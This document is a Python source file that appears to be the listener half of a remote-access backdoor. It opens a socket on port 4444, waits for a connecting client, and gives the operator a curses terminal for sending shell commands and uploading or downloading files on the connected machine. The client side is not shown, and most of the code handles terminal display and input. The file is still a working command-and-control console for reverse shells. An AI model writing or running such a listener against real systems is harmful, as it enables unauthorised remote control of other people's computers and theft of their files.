#!/usr/bin/python
# General - Connection to the client, able to send and recieve data. Testing on port 4444.
# General - json is used to manage serilisation to receive large data.


import traceback
import socket
import json
import base64
import curses
import time
import threading

class Listr:

    comm = ""
    lt_comm_ = []
    idx = 0

    cli_pad_y = 0 # Column size


    def __init__(self, addr, prt):
        listr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # The bellow is to reuse a connection if it doesn't go down with the connection to.
        listr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(addr)
        listr.bind((addr, prt))
        listr.listen(0)
        print("Connecting...") #testing
        self.conn, self.addrs = listr.accept()
        print("\nConnected to " + str(self.addrs) + "\n") #testing
    

    def main_curses(self):
        curses.wrapper(self.run)


    def send_data(self, data):
        json_data = json.dumps(data)
        self.conn.sendall(json_data.encode())


    def rcve_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(1024).decode() # plus sign is necessary.
                if json_data == "" or json_data == b'':
                    break
                return json.loads(json_data)
            except ValueError:               
                continue


    def exe_rmy(self, comm):
        self.send_data(comm)
        return self.rcve_data()


    def w_f(self, path, item):
        with open(path, "wb") as f:
            f.write(base64.b64decode(item))
            return "Downloaded\n"
    

    def r_f(self, path):
        # only r read plain text, with b reads binary. e.g.: open(path, "rb")
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()


    def run(self, cole):
        inp_ch = 0
        scrl_comm__ = -1 # To scroll commands sent
        scrl_stor__ = False
        in_resizing = False
        right_left = 0 # Index to go through the string that is typed (buff_ch)
        stor = ""
        buff_ch = ""
        output_comm__ = ""
        buff_com = [''] # story commands
        cur_yx__ = [0, 0] # Store the cursor's position
        self.cli_pad_y = 5000
        (coley, colex) = cole.getmaxyx()

        padUppL_row = self.cli_pad_y - coley
        padUppL_col = 0
        pad_window_rowUppL = 0
        pad_window_colUppL = 0
        pad_window_rowBotR = coley - 3
        pad_window_colBotR = colex - 1

        cli_p = curses.newpad(self.cli_pad_y, colex)
        cli_p.scrollok(True)
        cli_p.idlok(True)
        cli_p.keypad(True)

        cli_p_me_bar = curses.newpad(1, colex)
        cli_p_me_bar.keypad(True)
        cli_p_me_bar.border(curses.ACS_HLINE)
        curses.init_pair(2, curses.COLOR_BLACK, curses.COLOR_WHITE)
        curses.init_pair(3, curses.COLOR_GREEN, curses.COLOR_WHITE)
        curses.init_pair(4, curses.COLOR_BLACK, curses.COLOR_WHITE)

        curses.mousemask(1)

        try:
            cli_p.clear()
            cli_p.addstr(padUppL_row, padUppL_col, str(self.addrs) + "$ " + buff_ch)
            (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position

            while True:
                              
                ''' Adding string on bottom bar
                    The comparison with -1 is when the window.nodelay(True) is True as 
                    it will sending -1 continuously until it is turn off again window.nodelay(False)
                    This is happenig when resizing
                '''
                if not in_resizing and inp_ch != -1:
                    self.info_bar__(cli_p_me_bar, coley, colex, scrl_stor__)

                    cli_p.move(cur_yx__[0], cur_yx__[1]) # Sending the cursor onto its last position
                    # Making sure that in refresh coordinates are not given negative values.
                    cli_p.refresh(padUppL_row, padUppL_col, pad_window_rowUppL, pad_window_colUppL, pad_window_rowBotR, pad_window_colBotR)

                ''' Capturing the input
                    The main 'enter' key retrieve 10, whereas the another 'enter' key 343 which
                    is the value that's working. (??)
                    Using get_wch make use of capturing a wide form of charater, that includs the special ones.
                '''
                inp_ch = (lambda input: curses.KEY_ENTER if input == 10 or input == '\n' else input)(cli_p.getch())
                ## Testing purpose to check the entries
                # getmouse = curses.getmouse()
                # cli_p.addstr(cli_p.getyx()[0], cli_p.getyx()[1], str(inp_ch) + ' MOUSE: ' + str(curses.KEY_MOUSE) + ' REZISE: ' + str(curses.KEY_RESIZE) + ' getmouse: ' + str(getmouse))
                # print('\n\r\r' + str(inp_ch) + ' DC: ' + str(curses.KEY_DC) + ' REZISE: ' + str(curses.KEY_RESIZE))# + ' getmouse: ' + str(getmouse))
                # time.sleep(2)
                # continue
                
                # Handling the scroll
                if (inp_ch == curses.KEY_UP or inp_ch == curses.KEY_DOWN) and scrl_stor__:
                    inp_ch = self.app_k__(cli_p, padUppL_row, inp_ch, pad_window_rowBotR, pad_window_colBotR)
                if inp_ch == curses.KEY_F9:
                    scrl_stor__ = True if scrl_stor__ == False else False
                    continue


                # Resizing if the windows is resized
                if inp_ch == curses.KEY_RESIZE or in_resizing == True:
                    in_resizing = True
                    cli_p.nodelay(in_resizing)
                    while True:
                        (coley_c, colex_c) = cole.getmaxyx()
                        if coley_c != coley or colex_c != colex:
                            (coley, colex) = cole.getmaxyx()
                            time.sleep(0.1)
                            break                            
                        else:
                            padUppL_row = self.cli_pad_y - coley
                            pad_window_rowBotR = coley - 3 if coley >= 6 else 3
                            pad_window_colBotR = colex - 1 if colex >= 2 else 1

                            cole.clear()
                            cole.refresh()
                            cli_p.clear()
                            cli_p.resize(self.cli_pad_y, colex)
                            cli_p.addstr(padUppL_row, padUppL_col, stor + '\n' + str(self.addrs) + "$ " + buff_ch)
                            (cur_yx__[0], cur_yx__[1]) = cli_p.getyx()
                            self.info_bar_space__(cli_p, cur_yx__)
                            inp_ch = 0 # It needs to reset to another number different to -1. It came with -1 from the last cicle
                            right_left = 0 # Restart the cursor's index
                            in_resizing = False
                            cli_p.nodelay(in_resizing)
                            break
                    continue

                # Scrolling commands
                elif inp_ch == curses.KEY_UP or inp_ch == curses.KEY_DOWN and not scrl_stor__:
                    if inp_ch == curses.KEY_UP and not scrl_stor__:
                        # "-2" because the index of an array start with 0, and the first item in this array is empty '' that's why -1
                        if scrl_comm__ < len(buff_com) - 1 and len(buff_com) > 1:
                            if scrl_comm__ < len(buff_com) - 2 : scrl_comm__ += 1
                            buff_ch = buff_com[scrl_comm__]
                            cur_yx__[1] = len(str(self.addrs) + '$ ') + len(buff_ch) # Length of the default line

                    elif inp_ch == curses.KEY_DOWN and not scrl_stor__:
                        if scrl_comm__ > -1:
                            if scrl_comm__ > -1: scrl_comm__ -= 1
                            buff_ch = buff_com[scrl_comm__] if scrl_comm__ > -1 else ''
                            cur_yx__[1] = len(str(self.addrs) + '$ ') + len(buff_ch) # Length of the default line
                    right_left = 0 # Restart the cursor's index
                
                # Handling left and right arrows keys to go through the string that is typed (buff_ch)
                elif inp_ch == curses.KEY_LEFT:
                    if right_left > -len(buff_ch):
                        right_left -= 1
                        cli_p.move(cli_p.getyx()[0], cli_p.getyx()[1] - 1)
                        (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position
                    continue
                elif inp_ch == curses.KEY_RIGHT:
                    if right_left < 0:
                        right_left += 1
                        cli_p.move(cli_p.getyx()[0], cli_p.getyx()[1] + 1)
                        (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position
                    continue

                # Handlig story and command execution
                elif inp_ch == curses.KEY_ENTER:
                    # Managing the output storory and clear up the cli
                    if len(buff_ch.replace(' ', '')) > 0:
                        buff_com[:0] = [buff_ch] # buff_com is the story commands, which will be scrolled.
                    if buff_ch == 'clear': # To clear the screen
                        cli_p.clear()
                        cli_p.addstr(padUppL_row, padUppL_col, str(self.addrs) + "$ ")
                        (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position
                    else: # To execute command and create the story
                        output_comm__ = '\n\n' + str(self.s_comm__(buff_ch)).replace('\r', '')
                        stor += '\n' + str(self.addrs) + "$ " + buff_ch + output_comm__
                        cur_yx__[1] = len(str(self.addrs) + "$ ") + len(buff_ch) # Positioning the cursor back after the previews command
                        cli_p.addstr(cli_p.getyx()[0], cur_yx__[1], output_comm__ + '\n' + str(self.addrs) + "$ ")
                        (cur_yx__[0], cur_yx__[1]) = cli_p.getyx() # updating cursor's position

                        self.info_bar_space__(cli_p, cur_yx__)
                    # Restarting values
                    buff_ch = ''
                    scrl_comm__ = -1
                    right_left = 0 # Restart the cursor's index
                    continue

                # BACKSPACE
                elif inp_ch == curses.KEY_BACKSPACE:
                    if cur_yx__[1] > len(str(self.addrs) + "$ "):
                        # Remove a character. First, checking if the cursor's index (right_left) has been modify and is not as less as the length of -buff_ch
                        if right_left < 0 and right_left > -len(buff_ch):
                            # The for loop with the parameters given is working between the "minus" length of buff_ch to -1. 
                            # It is given 0 into range, however the loop just reach until -1.
                            buff_ch = ''.join([buff_ch[i] for i in range(-len(buff_ch), 0) if i != right_left - 1])
                        elif len(buff_ch) > 0:
                            # If the (right_left) cursor's index equal 0 so means hasn't been modified.
                            buff_ch = buff_ch[:-1]
                        cur_yx__[1] -= 1 # By every backspace the cursor goes back one position
                # DELETE
                elif inp_ch == curses.KEY_DC:
                    if cur_yx__[1] > (len(str(self.addrs) + "$ ") - 1) and len(buff_ch) > 0:
                        # Remove a character. First, checking if the cursor's index (right_left) has been modify and is not as less as the length of -buff_ch
                        if right_left < 0:
                            # The for loop with the parameters given is working between the "minus" length of buff_ch to -1. 
                            # It is given 0 into range, however the loop just reach until -1.
                            buff_ch = ''.join([buff_ch[i] for i in range(-len(buff_ch), 0) if i != right_left])
                        # Cursor's index keeps at the same place. String's index increase  by 1
                        right_left += 1
                # Receiving normal char
                # Make sure the new chars are character between 127 to 31 in ASCII table.
                elif inp_ch < 127 and inp_ch > 31:
                    if len(buff_ch) > 0 and right_left < 0:
                        buff_ch = buff_ch[:right_left] + chr(inp_ch) + buff_ch[right_left:]
                    else:
                        buff_ch += chr(inp_ch)
                    cur_yx__[1] += 1 # By every new char the cursor goes forward one position

                if inp_ch != -1:
                    cli_p.deleteln()
                    cli_p.addstr(cli_p.getyx()[0], padUppL_col, str(self.addrs) + "$ " + buff_ch)
                
        except (curses.error, Exception):
            # Making sure the nodelay is turn false
            cli_p.nodelay(False)
            cli_p.clear()
            print('\r' + traceback.format_exc().replace('\n', '\n\r'))
            print('Press whatever KEY to exit')
            cli_p.getch()

    
    # To create space for cli_p_me_bar__
    def info_bar_space__(self, cli_p, cur_yx):
        if cli_p.getyx()[0] >= cli_p.getmaxyx()[0] - 2:
            cli_p.addstr(cur_yx[0], cur_yx[1], '\n\n')
            # From the bottom to up 3 rows to set the cursor in its correct position.
            # This is because the line can't end in the last two row so that is possible
            # to show the info bar
            cur_yx[0] = cli_p.getmaxyx()[0] - 3
            cli_p.move(cur_yx[0], cur_yx[1]) # Restart cursor's positio


    def s_comm__(self, comm):
        wait_dwnl_eve = threading.Event()
        wait_dwnl = threading.Thread(target=self.wait_dwnl__, args=(wait_dwnl_eve,))
        try:
            self.comm = comm.split(" ")
            # Here, the file is appended to the file.
            if self.comm[0] == "upload":
                self.comm.append(self.r_f(self.comm[1]))
            if self.comm[0] == "download":
                wait_dwnl.start()
            result = self.exe_rmy(self.comm)
            wait_dwnl_eve.set()
            time.sleep(0.5)
            # while is to make sure if there is still connection
            while result == None:
                result = self.exe_rmy(self.comm)
            if self.comm[0] == "download" and "[Bad command]" not in result:
                result = self.w_f(self.comm[1], result.encode())
            if "exit" in comm:
                self.send_data("test...")
            return result
        except FileNotFoundError as notfound:
            # print(f"\n\r{notfound.strerror}\n")
            return notfound.strerror
        except (BrokenPipeError, ConnectionError) as cnerr:
            # print(cnerr.strerror + " - Connection down")
            self.conn.close()
            raise Exception(cnerr.strerror + " - Connection down")
    

    # Waiting
    def wait_dwnl__(self, eve):
        print("\n\rDownloading...", end='  ')
        while not eve.is_set():
            for ch in ['- ', '\\ ', '| ', '/ ', '=S']:
                print('\b\b' + ch, end='', flush=True)
                time.sleep(0.3)
                if eve.is_set(): break

    # scrolling
    def app_k__(self, cli_p, row, input_, y_bottom, x_bottom):
        max_row = row
        curses.curs_set(0)
        while True:
            if input_ != -1:
                if input_ == curses.KEY_UP:
                    if row > 0:
                        row -= 1
                elif input_ == curses.KEY_DOWN:
                    if row < max_row:
                        row += 1
                if y_bottom >= 3 and x_bottom >= 1: # Making sure that in refresh coordinates are not given negative values.
                    cli_p.refresh(row, 0, 0, 0, y_bottom, x_bottom)
                
                if input_ != curses.KEY_UP and input_ != curses.KEY_DOWN:
                    break
            input_ = cli_p.getch()
        curses.curs_set(1)
        return input_


    # To allow the scrolling
    def info_bar__(self, pad, coley, colex, ena_scrl):
        pad.deleteln()
        if ena_scrl:
            pad.addstr(0, 0, "Press F9 key to disable scroll: ", curses.color_pair(4))
            pad.addstr(0, pad.getyx()[1], "scroll on", curses.color_pair(3))
        else:
            pad.addstr(0, 0, "Press F9 key to enable scroll: ", curses.color_pair(4))
            pad.addstr(0, pad.getyx()[1], "scroll off", curses.color_pair(2))
        # Making sure that in refresh coordinates are not given negative values.
        if coley >= 2 and colex >= 2:
            pad.refresh(0, 0, coley - 1, 0, coley - 1, colex - 1)
        else:
            pad.refresh(0, 0, 0, 0, 1, 1)

            
try:
    my_listner = Listr('', 4444)
    my_listner.main_curses()
except (RuntimeError, Exception):
    print(traceback.format_exc())